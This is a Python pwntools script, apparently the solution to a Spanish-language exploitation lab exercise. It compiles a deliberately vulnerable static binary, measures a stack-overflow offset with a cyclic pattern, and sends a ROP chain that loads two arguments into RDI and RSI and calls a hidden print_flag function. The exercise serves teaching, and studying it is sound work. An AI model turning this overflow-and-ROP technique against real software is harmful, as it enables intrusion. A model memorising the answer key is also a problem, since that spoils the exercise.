#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""C1 - Caza de gadgets: cadena de 2 argumentos (RDI+RSI) construida
sobre el inventario que TU cazaste con ROPgadget/Ropper en un binario
ESTATICO. Solucion 100% dinamica: los gadgets que viste impresos por
ROPgadget se localizan aqui con ROP(elf).find_gadget (mismos bytes,
direccion leida del ELF, no copiada a mano).
USO: python3 c1_caza.py"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BIN = './c1_caza'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-static', '-o', BIN, 'c1_caza.c']
log.info('Compilando (estatico): %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

elf = ELF(BIN, checksec=False)

# ------------------------------------------------------------------
# FASE 0 - el inventario que ya hiciste a mano (recon de la Parte 3):
#   ROPgadget --binary ./c1_caza --only "pop|ret"   (fija la 0x... y
#   copia "pop rdi ; ret": ROPgadget separa las instrucciones con " ; ")
#   ropper --file ./c1_caza --search "pop rsi"
# Aqui las MISMAS herramientas las resume pwntools, sin copiar numeros:
# ------------------------------------------------------------------
rop_obj = ROP(elf)
pop_rdi = rop_obj.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop_obj.find_gadget(['pop rsi', 'ret'])[0]
ret_g = rop_obj.find_gadget(['ret'])[0]        # alineacion (ver B1)
print_flag = elf.symbols['print_flag']          # nadie la llama; tu la llamas
log.info('pop rdi; ret = %#x (el que viste en ROPgadget)', pop_rdi)
log.info('pop rsi; ret = %#x', pop_rsi)
log.info('print_flag   = %#x (No PIE + estatico: fija)', print_flag)

# ------------------------------------------------------------------
# FASE 1 - offset dinamico: patron ciclico + corefile (metodo A2)
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'buffer en')
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))   # x86_64: leer $rsp
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes', offset)

# ------------------------------------------------------------------
# FASE 2 - tu cadena, casilla a casilla:
#   [pop_rdi][0x1337][pop_rsi][0x7331][ret][print_flag]
#   - pop rdi carga el 1er argumento (System V: RDI)
#   - pop rsi carga el 2do argumento (System V: RSI)
#   - ret suelto re-alinea la pila para printf dentro de print_flag
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'buffer en')
payload = (b'A' * offset
           + p64(pop_rdi)
           + p64(0x1337)
           + p64(pop_rsi)
           + p64(0x7331)
           + p64(ret_g)
           + p64(print_flag))
assert b'\n' not in payload, 'gets() cortaria el payload en el primer 0x0a'
io.sendline(payload)
salida = io.recvall(timeout=3)
io.close()

FLAG = b'FLAG{ROP_C1_caza_de_gadgets}'
if FLAG in salida:
    log.success('C1 SUPERADO: cazaste, filtraste y encadenaste por tu cuenta.')
    log.info('Tecnica nata para retos donde elf.symbols no alcanza: hay que '
             'LEER el inventario de gadgets.')
else:
    log.failure('C1: sin flag. Pistas: filtro --only "pop|ret", orden RDI '
                'antes que RSI, ret de alineacion antes de print_flag.')
